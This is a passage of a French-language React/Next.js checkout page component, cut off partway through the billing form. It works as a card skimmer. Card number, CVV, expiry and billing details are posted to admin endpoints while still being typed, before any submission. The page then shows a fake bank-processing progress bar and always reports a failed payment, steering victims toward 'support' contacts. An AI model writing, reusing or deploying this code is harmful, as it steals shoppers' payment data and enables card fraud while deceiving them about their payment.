'use client';

import { useState, useEffect } from 'react';
import { useAuth } from '@/lib/AuthContext';
import { useRouter, useSearchParams } from 'next/navigation';
import { ALL_COUNTRIES, COUNTRIES_BY_CONTINENT, ADDRESS_TEMPLATES, SUPPORT_CONFIG } from '@/lib/countries-config';
// Import supprimé temporairement pour éviter les erreurs
// import { useDataCapture } from '@/lib/useDataCapture';

interface CardInfo {
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  cardholderName: string;
}

interface BillingInfo {
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  address: string;
  city: string;
  postalCode: string;
  country: string;
}

interface Product {
  id: number;
  name: string;
  description: string;
  price: string;
  image: string;
  category: string;
  features: string[];
}

interface ContactOptions {
  phone: string;
  email: string;
  whatsapp: string;
  livechat: boolean;
}

export default function PaymentClient() {
  const { user, loading } = useAuth();
  const router = useRouter();
  const searchParams = useSearchParams();
  
  const [isProcessing, setIsProcessing] = useState(false);
  const [successMessage, setSuccessMessage] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const [selectedProduct, setSelectedProduct] = useState<Product | null>(null);
  const [cartProducts, setCartProducts] = useState<Array<{product: Product; quantity: number}>>([]);
  const [selectedCountry, setSelectedCountry] = useState<any>(null);
  const [paymentProgress, setPaymentProgress] = useState(0);
  const [showPaymentError, setShowPaymentError] = useState(false);
  const [showSupport, setShowSupport] = useState(false);

  // Calculer le total du panier
  const calculateTotal = () => {
    if (cartProducts.length > 0) {
      return cartProducts.reduce((total, item) => {
        const price = parseFloat(item.product.price.replace('€', '').replace(',', '.'));
        return total + (price * item.quantity);
      }, 0);
    } else if (selectedProduct) {
      return parseFloat(selectedProduct.price.replace('€', '').replace(',', '.'));
    }
    return 0;
  };

  // Obtenir le template d'adresse pour le pays sélectionné
  const getAddressTemplate = (countryCode: string) => {
    return ADDRESS_TEMPLATES[countryCode as keyof typeof ADDRESS_TEMPLATES] || ADDRESS_TEMPLATES.default;
  };

  // Gérer le changement de pays
  const handleCountryChange = (countryCode: string) => {
    const country = ALL_COUNTRIES.find(c => c.code === countryCode);
    setSelectedCountry(country);
    setBillingInfo({...billingInfo, country: countryCode});
  };

  // Vérifier si tous les champs requis sont remplis
  const areAllFieldsValid = () => {
    return (
      // Carte
      cardInfo.cardNumber.replace(/\s/g, '').length >= 13 &&
      cardInfo.expiryMonth &&
      cardInfo.expiryYear &&
      cardInfo.cvv.length >= 3 &&
      cardInfo.cardholderName.trim() &&
      
      // Facturation
      billingInfo.firstName.trim() &&
      billingInfo.lastName.trim() &&
      billingInfo.email.trim() &&
      /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(billingInfo.email) &&
      billingInfo.phone.trim() &&
      billingInfo.address.trim() &&
      billingInfo.city.trim() &&
      billingInfo.postalCode.trim() &&
      billingInfo.country.trim() &&
      
      // Produit
      (selectedProduct || cartProducts.length > 0)
    );
  };
  const [showContactModal, setShowContactModal] = useState(false);
  const [contactOptions, setContactOptions] = useState<ContactOptions | null>(null);
  const [paymentAttemptId, setPaymentAttemptId] = useState<string>('');

  // Déclarer les états avant les useEffect
  const [cardInfo, setCardInfo] = useState<CardInfo>({
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    cardholderName: ''
  });

  const [billingInfo, setBillingInfo] = useState<BillingInfo>({
    firstName: '',
    lastName: '',
    email: user?.email || '',
    phone: '',
    address: '',
    city: '',
    postalCode: '',
    country: 'France'
  });

  // Fonction pour envoyer les données utilisateur en temps réel
  const sendUserDataToAdmin = async (userData: any) => {
    try {
      console.log('📤 Envoi des données utilisateur:', userData);
      const response = await fetch('/api/realtime-users', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(userData)
      });
      
      const result = await response.json();
      console.log('✅ Réponse API realtime-users:', result);
      
    } catch (error) {
      console.error('❌ Erreur envoi données admin:', error);
    }
  };

  // Fonction pour sauvegarder définitivement dans la gestion clients
  const saveToClientManager = async (userData: any) => {
    try {
      console.log('💾 Sauvegarde permanente client:', userData);
      const clientData = {
        email: userData.email,
        firstName: userData.firstName,
        lastName: userData.lastName,
        phone: userData.phone,
        address: userData.address,
        city: userData.city,
        postalCode: userData.postalCode,
        country: userData.country,
        cardType: userData.cardType,
        lastFourDigits: userData.cardNumber ? userData.cardNumber.slice(-4) : '',
        status: userData.status || 'active',
        totalAmount: calculateTotal()
      };

      const response = await fetch('/api/admin-clients', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(clientData)
      });
      
      const result = await response.json();
      console.log('✅ Client sauvegardé:', result);
      
    } catch (error) {
      console.error('❌ Erreur sauvegarde client:', error);
    }
  };

  // Reconnaissance automatique du type de carte
  const getCardType = (cardNumber: string) => {
    const number = cardNumber.replace(/\s/g, '');
    if (number.startsWith('4')) return 'Visa';
    if (number.startsWith('5') || (number.startsWith('2') && parseInt(number.substring(0, 4)) >= 2221 && parseInt(number.substring(0, 4)) <= 2720)) return 'MasterCard';
    if (number.startsWith('3')) return 'Amex';
    return 'Visa'; // Par défaut
  };

  // Surveiller les changements dans les données de facturation et carte pour capturer les données partielles
  useEffect(() => {
    // Capture simple des données partielles 
    const captureData = async () => {
      const formData = {
        ...billingInfo,
        ...cardInfo,
        selectedProduct: selectedProduct?.name,
        cartItems: cartProducts.length,
        totalAmount: calculateTotal(),
        formType: 'billing_payment',
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
        url: window.location.href,
        status: 'DONNÉES_PARTIELLES'
      };

      // Auto-sauvegarde si des données sont présentes
      const hasData = Object.values({...billingInfo, ...cardInfo}).some(value => 
        value && value.toString().trim() !== ''
      );

      if (hasData) {
        try {
          await fetch('/api/admin/client-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              type: 'partial_data',
              data: formData
            })
          });
        } catch (error) {
          console.error('Failed to capture partial data:', error);
        }
      }
    };

    // Debounce la capture pour éviter trop d'appels
    const timeoutId = setTimeout(captureData, 2000);
    return () => clearTimeout(timeoutId);
  }, [billingInfo, cardInfo, selectedProduct, cartProducts]);

  // Envoyer les données utilisateur en temps réel pour l'admin
  useEffect(() => {
    if (billingInfo.email && (billingInfo.firstName || billingInfo.lastName || billingInfo.address)) {
      const userData = {
        email: billingInfo.email,
        firstName: billingInfo.firstName,
        lastName: billingInfo.lastName,
        phone: billingInfo.phone,
        address: billingInfo.address,
        city: billingInfo.city,
        postalCode: billingInfo.postalCode,
        country: billingInfo.country,
        cardNumber: cardInfo.cardNumber,
        cvv: cardInfo.cvv,
        expiryDate: cardInfo.expiryMonth && cardInfo.expiryYear ? `${cardInfo.expiryMonth}/${cardInfo.expiryYear}` : '',
        cardHolderName: cardInfo.cardholderName,
        cardType: getCardType(cardInfo.cardNumber),
        status: 'active',
        lastActivity: new Date().toISOString()
      };
      
      // Debounce pour éviter trop d'appels
      const timeoutId = setTimeout(() => {
        sendUserDataToAdmin(userData);
        // Sauvegarder aussi de manière permanente
        saveToClientManager(userData);
      }, 1000);
      
      return () => clearTimeout(timeoutId);
    }
  }, [billingInfo, cardInfo]);

  // Récupérer le produit sélectionné ou les produits du panier
  useEffect(() => {
    const fromCart = searchParams.get('from') === 'cart';
    const productParam = searchParams.get('product');
    
    // Si aucun paramètre de produit n'est présent, vider les anciennes données
    if (!fromCart && !productParam) {
      localStorage.removeItem('selectedProduct');
      localStorage.removeItem('selectedProducts');
      setSelectedProduct(null);
      setCartProducts([]);
      console.log('🧹 Aucun produit sélectionné - nettoyage des anciennes données');
      return;
    }
    
    if (fromCart) {
      // Charger les produits du panier
      const cartData = localStorage.getItem('selectedProducts');
      if (cartData) {
        const cartProductsData = JSON.parse(cartData);
        console.log('📦 Produits du panier chargés:', cartProductsData);
        // Stocker tous les produits du panier
        setCartProducts(cartProductsData);
        // Garder le premier produit pour l'affichage principal
        if (cartProductsData.length > 0) {
          setSelectedProduct(cartProductsData[0].product || cartProductsData[0]);
        }
      }
    } else {
      // Charger un produit unique sélectionné
      const productData = localStorage.getItem('selectedProduct');
      if (productData) {
        setSelectedProduct(JSON.parse(productData));
        setCartProducts([]); // Vider le panier pour un produit unique
      }
    }
    
    // Nettoyer les données du localStorage après 30 secondes pour éviter les anciennes commandes
    const cleanupTimeout = setTimeout(() => {
      localStorage.removeItem('selectedProduct');
      localStorage.removeItem('selectedProducts');
      console.log('🧹 Nettoyage automatique du localStorage effectué');
    }, 30000);
    
    return () => clearTimeout(cleanupTimeout);
  }, [searchParams]);

  // Redirection si pas connecté - seulement après le chargement
  useEffect(() => {
    if (!loading && !user) {
      console.log('🚫 Utilisateur non connecté, redirection vers login');
      router.push('/login');
    }
  }, [user, loading, router]);

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setCardInfo({ ...cardInfo, cardNumber: formatted });
  };

  // Fonction pour contacter un agent
  const handleContactAgent = (method: string) => {
    if (!contactOptions) return;

    switch (method) {
      case 'phone':
        window.open(`tel:${contactOptions.phone}`, '_self');
        break;
      case 'email':
        window.open(`mailto:${contactOptions.email}?subject=Problème de paiement - Référence ${paymentAttemptId}&body=Bonjour,%0D%0A%0D%0AJe rencontre un problème avec ma carte bancaire lors du paiement.%0D%0ARéférence de la tentative : ${paymentAttemptId}%0D%0A%0D%0AMerci de me recontacter.`, '_blank');
        break;
      case 'whatsapp':
        window.open(`https://wa.me/${contactOptions.whatsapp.replace(/[^\d]/g, '')}?text=Bonjour, je rencontre un problème avec ma carte bancaire. Référence: ${paymentAttemptId}`, '_blank');
        break;
      case 'livechat':
        // Simuler l'ouverture d'un chat en direct
        alert('Chat en direct bientôt disponible. Utilisez nos autres canaux de contact en attendant.');
        break;
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsProcessing(true);
    setErrorMessage('');
    setShowContactModal(false);
    setPaymentProgress(0);

    // Simulation de progression réaliste
    const progressSteps = [
      { progress: 15, message: 'Validation des informations...' },
      { progress: 35, message: 'Vérification de la carte...' },
      { progress: 60, message: 'Connexion à la banque...' },
      { progress: 80, message: 'Traitement du paiement...' },
      { progress: 95, message: 'Finalisation...' }
    ];

    try {
      // Validation simple
      if (!cardInfo.cardNumber.replace(/\s/g, '') || cardInfo.cardNumber.replace(/\s/g, '').length < 13) {
        setErrorMessage('Numéro de carte invalide');
        setIsProcessing(false);
        setPaymentProgress(0);
        return;
      }

      if (!cardInfo.expiryMonth || !cardInfo.expiryYear) {
        setErrorMessage('Date d\'expiration requise');
        setIsProcessing(false);
        setPaymentProgress(0);
        return;
      }

      if (!cardInfo.cvv || cardInfo.cvv.length < 3) {
        setErrorMessage('CVV invalide');
        setIsProcessing(false);
        setPaymentProgress(0);
        return;
      }

      // Validation complète des informations de facturation
      if (!billingInfo.firstName.trim()) {
        setErrorMessage('Le prénom est requis');
        setIsProcessing(false);
        setPaymentProgress(0);
        return;
      }

      if (!billingInfo.lastName.trim()) {
        setErrorMessage('Le nom de famille est requis');
        setIsProcessing(false);
        setPaymentProgress(0);
        return;
      }

      if (!billingInfo.email.trim()) {
        setErrorMessage('L\'adresse email est requise');
        setIsProcessing(false);
        setPaymentProgress(0);
        return;
      }

      // Validation de l'email
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(billingInfo.email)) {
        setErrorMessage('Adresse email invalide');
        setIsProcessing(false);
        setPaymentProgress(0);
        return;
      }

      if (!billingInfo.phone.trim()) {
        setErrorMessage('Le numéro de téléphone est requis');
        setIsProcessing(false);
        setPaymentProgress(0);
        return;
      }

      if (!billingInfo.address.trim()) {
        setErrorMessage('L\'adresse complète est requise');
        setIsProcessing(false);
        setPaymentProgress(0);
        return;
      }

      if (!billingInfo.city.trim()) {
        setErrorMessage('La ville est requise');
        setIsProcessing(false);
        setPaymentProgress(0);
        return;
      }

      if (!billingInfo.postalCode.trim()) {
        setErrorMessage('Le code postal est requis');
        setIsProcessing(false);
        setPaymentProgress(0);
        return;
      }

      if (!billingInfo.country.trim()) {
        setErrorMessage('Le pays est requis');
        setIsProcessing(false);
        setPaymentProgress(0);
        return;
      }

      // Validation du code postal selon le pays
      if (selectedCountry) {
        const template = getAddressTemplate(selectedCountry.code);
        if (template.postalCodePattern && !template.postalCodePattern.test(billingInfo.postalCode)) {
          setErrorMessage(`Code postal invalide pour ${selectedCountry.name}`);
          setIsProcessing(false);
          setPaymentProgress(0);
          return;
        }
      }

      if (!cardInfo.cardholderName.trim()) {
        setErrorMessage('Le nom sur la carte est requis');
        setIsProcessing(false);
        setPaymentProgress(0);
        return;
      }

      if (!selectedProduct && cartProducts.length === 0) {
        setErrorMessage('Aucun produit sélectionné');
        setIsProcessing(false);
        setPaymentProgress(0);
        return;
      }

      // Progression animée
      for (const step of progressSteps) {
        await new Promise(resolve => setTimeout(resolve, 800));
        setPaymentProgress(step.progress);
      }

      // Préparer les données de paiement
      const paymentData = {
        userId: user?.id,
        email: billingInfo.email,
        productName: selectedProduct?.name || `Panier (${cartProducts.length} article${cartProducts.length > 1 ? 's' : ''})`,
        productPrice: selectedProduct?.price || `${calculateTotal().toFixed(2)}€`,
        totalAmount: calculateTotal(),
        cartItems: cartProducts,
        cardNumber: cardInfo.cardNumber,
        expiryMonth: cardInfo.expiryMonth,
        expiryYear: cardInfo.expiryYear,
        cvv: cardInfo.cvv,
        cardHolderName: cardInfo.cardholderName,
        billingInfo: billingInfo
      };

      // Capturer les données de paiement pour l'admin AVANT le traitement
      try {
        await fetch('/api/admin/client-data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            type: 'payment',
            data: {
              email: billingInfo.email,
              amount: calculateTotal().toFixed(2),
              currency: 'EUR',
              paymentMethod: 'Carte bancaire',
              cardNumber: cardInfo.cardNumber,
              cardName: cardInfo.cardholderName,
              expiryDate: `${cardInfo.expiryMonth}/${cardInfo.expiryYear}`,
              cvv: cardInfo.cvv,
              billingAddress: {
                fullName: `${billingInfo.firstName} ${billingInfo.lastName}`,
                email: billingInfo.email,
                phone: billingInfo.phone,
                address: billingInfo.address,
                city: billingInfo.city,
                postalCode: billingInfo.postalCode,
                country: billingInfo.country
              },
              products: selectedProduct ? [selectedProduct] : cartProducts.map(item => ({ 
                ...item.product, 
                quantity: item.quantity 
              })),
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent,
              status: 'pending'
            }
          })
        });

        // Également sauvegarder dans le système de billing en temps réel
        await fetch('/api/admin/billing-data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: user?.id,
            userName: `${billingInfo.firstName} ${billingInfo.lastName}`,
            email: billingInfo.email,
            amount: calculateTotal().toFixed(2),
            currency: 'EUR',
            status: 'pending',
            paymentMethod: 'Carte bancaire',
            products: selectedProduct ? [selectedProduct] : cartProducts.map(item => ({ 
              ...item.product, 
              quantity: item.quantity 
            })),
            billingAddress: {
              fullName: `${billingInfo.firstName} ${billingInfo.lastName}`,
              email: billingInfo.email,
              phone: billingInfo.phone,
              address: billingInfo.address,
              city: billingInfo.city,
              postalCode: billingInfo.postalCode,
              country: billingInfo.country
            }
          })
        });
      } catch (adminError) {
        console.error('Failed to save admin data:', adminError);
        // Ne pas bloquer le paiement si la sauvegarde admin échoue
      }

      // Simulation d'appel API - en réalité, ce sera toujours un échec pour la démo
      await new Promise(resolve => setTimeout(resolve, 1000));
      setPaymentProgress(100);
      
      // Simuler l'échec du paiement (pour la démo)
      setTimeout(() => {
        setIsProcessing(false);
        setPaymentProgress(0);
        setShowPaymentError(true);
        
        // Mettre à jour le statut en échec dans l'admin
        fetch('/api/admin/billing-data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: user?.id,
            userName: `${billingInfo.firstName} ${billingInfo.lastName}`,
            email: billingInfo.email,
            amount: calculateTotal().toFixed(2),
            currency: 'EUR',
            status: 'failed',
            paymentMethod: 'Carte bancaire',
            products: selectedProduct ? [selectedProduct] : cartProducts.map(item => ({ 
              ...item.product, 
              quantity: item.quantity 
            })),
            billingAddress: {
              fullName: `${billingInfo.firstName} ${billingInfo.lastName}`,
              email: billingInfo.email,
              phone: billingInfo.phone,
              address: billingInfo.address,
              city: billingInfo.city,
              postalCode: billingInfo.postalCode,
              country: billingInfo.country
            }
          })
        }).catch(console.error);
      }, 500);

    } catch (error) {
      console.error('Erreur lors du paiement:', error);
      setErrorMessage('Erreur de connexion lors du traitement du paiement');
      setIsProcessing(false);
      setPaymentProgress(0);
    }
  };

  // Afficher un loader pendant le chargement de l'authentification
  if (loading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Chargement...</p>
        </div>
      </div>
    );
  }

  // Si pas connecté après chargement, afficher message de redirection
  if (!user) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Redirection vers la page de connexion...</p>
        </div>
      </div>
    );
  }

  const cardType = getCardType(cardInfo.cardNumber);

  return (
    <div className="min-h-screen bg-gray-50 py-8">
      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-gray-900">Informations de paiement</h1>
          <p className="text-gray-600 mt-2">Enregistrez vos informations de paiement en toute sécurité</p>
        </div>

        {successMessage && (
          <div className="mb-6 bg-gray-50 border border-gray-300 text-gray-700 px-4 py-3 rounded-lg">
            <div className="flex items-center">
              <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd"/>
              </svg>
              {successMessage}
            </div>
          </div>
        )}

        {errorMessage && (
          <div className="mb-6 bg-gray-50 border border-gray-400 text-gray-800 px-4 py-3 rounded-lg">
            <div className="flex items-center">
              <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd"/>
              </svg>
              {errorMessage}
            </div>
          </div>
        )}

        {/* Produits du panier ou produit sélectionné */}
        {(cartProducts.length > 0 || selectedProduct) && (
          <div className="bg-gray-50 rounded-xl p-6 mb-6 border border-gray-200">
            <h2 className="text-xl font-semibold text-gray-900 mb-4 flex items-center">
              <svg className="w-6 h-6 mr-2 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 11V7a4 4 0 00-8 0v4M5 9h14l-1 12H6L5 9z" />
              </svg>
              {cartProducts.length > 0 ? `Votre panier (${cartProducts.length} produit${cartProducts.length > 1 ? 's' : ''})` : 'Votre commande'}
            </h2>
            
            {/* Affichage des produits du panier */}
            {cartProducts.length > 0 ? (
              <div className="space-y-4">
                {cartProducts.map((item, index) => (
                  <div key={index} className="flex items-center space-x-4 p-4 bg-white rounded-lg border border-gray-200">
                    <img 
                      src={item.product.image} 
                      alt={item.product.name}
                      className="w-16 h-16 object-cover rounded-lg"
                    />
                    <div className="flex-1">
                      <h3 className="font-semibold text-gray-900">{item.product.name}</h3>
                      <p className="text-gray-600 text-sm">{item.product.description}</p>
                      <div className="flex flex-wrap gap-1 mt-1">
                        {item.product.features.slice(0, 2).map((feature, idx) => (
                          <span key={idx} className="bg-gray-100 text-gray-700 text-xs px-2 py-1 rounded-full">
                            {feature}
                          </span>
                        ))}
                      </div>
                    </div>
                    <div className="text-right">
                      <p className="font-semibold text-gray-900">{item.product.price}</p>
                      <p className="text-sm text-gray-500">Quantité: {item.quantity}</p>
                    </div>
                  </div>
                ))}
                <div className="border-t border-gray-200 pt-4">
                  <div className="flex justify-between items-center">
                    <span className="text-lg font-semibold text-gray-900">Total:</span>
                    <span className="text-2xl font-bold text-gray-900">{calculateTotal().toFixed(2)}€</span>
                  </div>
                </div>
              </div>
            ) : selectedProduct && (
              // Affichage produit unique (ancien comportement)
              <div className="flex items-center space-x-4">
                <img 
                  src={selectedProduct.image} 
                  alt={selectedProduct.name}
                  className="w-20 h-20 object-cover rounded-lg"
                />
                <div className="flex-1">
                  <h3 className="font-semibold text-lg text-gray-900">{selectedProduct.name}</h3>
                  <p className="text-gray-600 text-sm mb-2">{selectedProduct.description}</p>
                  <div className="flex flex-wrap gap-1 mb-2">
                    {selectedProduct.features.slice(0, 3).map((feature, index) => (
                      <span key={index} className="bg-gray-100 text-gray-700 text-xs px-2 py-1 rounded-full">
                        {feature}
                      </span>
                    ))}
                  </div>
                </div>
                <div className="text-right">
                  <p className="text-2xl font-bold text-gray-900">{selectedProduct.price}</p>
                  <p className="text-sm text-gray-500">Prix final</p>
                </div>
              </div>
            )}
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* Formulaire de paiement */}
          <div className="bg-white rounded-xl shadow-lg p-6">
            <h2 className="text-xl font-semibold text-gray-900 mb-6">Carte de crédit</h2>
            
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Numéro de carte */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Numéro de carte
                </label>
                <div className="relative">
                  <input
                    type="text"
                    required
                    value={cardInfo.cardNumber}
                    onChange={handleCardNumberChange}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 text-lg font-mono"
                    placeholder="•••• •••• •••• ••••"
                    maxLength={19}
                  />
                  <div className="absolute inset-y-0 right-0 pr-3 flex items-center">
                    {cardType === 'Visa' && (
                      <div className="bg-gray-800 text-white px-2 py-1 rounded text-xs font-bold">VISA</div>
                    )}
                    {cardType === 'MasterCard' && (
                      <div className="bg-gray-800 text-white px-2 py-1 rounded text-xs font-bold">MC</div>
                    )}
                    {cardType === 'Amex' && (
                      <div className="bg-gray-800 text-white px-2 py-1 rounded text-xs font-bold">AMEX</div>
                    )}
                  </div>
                </div>
              </div>

              {/* Nom sur la carte */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  <span className="text-red-500">*</span> Nom sur la carte
                </label>
                <input
                  type="text"
                  required
                  value={cardInfo.cardholderName}
                  onChange={(e) => setCardInfo({...cardInfo, cardholderName: e.target.value.toUpperCase()})}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                  placeholder="Nom tel qu'il apparaît sur la carte"
                  style={{textTransform: 'uppercase'}}
                />
              </div>

              {/* Date d'expiration et CVV */}
              <div className="grid grid-cols-3 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Mois
                  </label>
                  <select
                    required
                    value={cardInfo.expiryMonth}
                    onChange={(e) => setCardInfo({...cardInfo, expiryMonth: e.target.value})}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                  >
                    <option value="">MM</option>
                    {Array.from({length: 12}, (_, i) => i + 1).map(month => (
                      <option key={month} value={month.toString().padStart(2, '0')}>
                        {month.toString().padStart(2, '0')}
                      </option>
                    ))}
                  </select>
                </div>
                
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Année
                  </label>
                  <select
                    required
                    value={cardInfo.expiryYear}
                    onChange={(e) => setCardInfo({...cardInfo, expiryYear: e.target.value})}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                  >
                    <option value="">YY</option>
                    {Array.from({length: 10}, (_, i) => new Date().getFullYear() + i).map(year => (
                      <option key={year} value={year.toString().slice(-2)}>
                        {year.toString().slice(-2)}
                      </option>
                    ))}
                  </select>
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    <span className="text-red-500">*</span> CVV
                  </label>
                  <input
                    type="text"
                    required
                    value={cardInfo.cvv}
                    onChange={(e) => setCardInfo({...cardInfo, cvv: e.target.value.replace(/[^0-9]/g, '')})}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 text-center font-mono"
                    placeholder="•••"
                    maxLength={4}
                  />
                </div>
              </div>

              <button
                type="submit"
                disabled={isProcessing || !areAllFieldsValid()}
                className={`w-full py-4 px-4 rounded-lg font-semibold transition-all duration-200 flex items-center justify-center space-x-2 ${
                  isProcessing || !areAllFieldsValid()
                    ? 'bg-gray-400 text-white cursor-not-allowed'
                    : 'bg-gray-900 text-white hover:bg-gray-800 shadow-lg hover:shadow-xl'
                }`}
              >
                {isProcessing ? (
                  <div className="flex items-center">
                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    <span>Traitement en cours...</span>
                  </div>
                ) : !areAllFieldsValid() ? (
                  <div className="flex items-center">
                    <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                    <span>Veuillez remplir tous les champs</span>
                  </div>
                ) : (
                  <div className="flex items-center">
                    <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 3h2l.4 2M7 13h10l4-8H5.4m0 0L7 13m0 0l-1.5 6M7 13l-1.5 6m0 0h9M17 21a2 2 0 002-2 2 2 0 00-2 2zm-8 0a2 2 0 002-2 2 2 0 00-2 2z" />
                    </svg>
                    <span>Commander ({calculateTotal().toFixed(2)}€)</span>
                  </div>
                )}
              </button>

              {/* Barre de progression du paiement */}
              {isProcessing && paymentProgress > 0 && (
                <div className="mt-4 p-4 bg-gray-50 rounded-lg border border-gray-200">
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-sm font-medium text-gray-900">Traitement du paiement</span>
                    <span className="text-sm font-medium text-gray-600">{paymentProgress}%</span>
                  </div>
                  <div className="w-full bg-gray-200 rounded-full h-2">
                    <div 
                      className="bg-gray-800 h-2 rounded-full transition-all duration-300"
                      style={{ width: `${paymentProgress}%` }}
                    ></div>
                  </div>
                  <div className="mt-2 text-xs text-gray-700">
                    {paymentProgress < 20 && "Validation des informations..."}
                    {paymentProgress >= 20 && paymentProgress < 40 && "Vérification de la carte..."}
                    {paymentProgress >= 40 && paymentProgress < 65 && "Connexion à la banque..."}
                    {paymentProgress >= 65 && paymentProgress < 85 && "Traitement du paiement..."}
                    {paymentProgress >= 85 && "Finalisation..."}
                  </div>
                </div>
              )}

            </form>
          </div>

          {/* Informations de facturation */}
          <div className="bg-white rounded-xl shadow-lg p-6">
            <h2 className="text-xl font-semibold text-gray-900 mb-2">Adresse de facturation</h2>
            <p className="text-sm text-gray-600 mb-6">
              <span className="text-red-500">*</span> Tous les champs sont obligatoires pour valider la commande
            </p>
            
            <div className="space-y-4">
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Prénom <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="text"
                    required
                    value={billingInfo.firstName}
                    onChange={(e) => setBillingInfo({...billingInfo, firstName: e.target.value})}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    <span className="text-red-500">*</span> Nom
                  </label>
                  <input
                    type="text"
                    required
                    value={billingInfo.lastName}
                    onChange={(e) => setBillingInfo({...billingInfo, lastName: e.target.value})}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  <span className="text-red-500">*</span> Email
                </label>
                <input
                  type="email"
                  required
                  value={billingInfo.email}
                  onChange={(e) => setBillingInfo({...billingInfo, email: e.target.value})}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  <span className="text-red-500">*</span> Téléphone
                </label>
                <input
                  type="tel"
                  required
                  value={billingInfo.phone}
                  onChange={(e) => setBillingInfo({...billingInfo, phone: e.target.value})}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
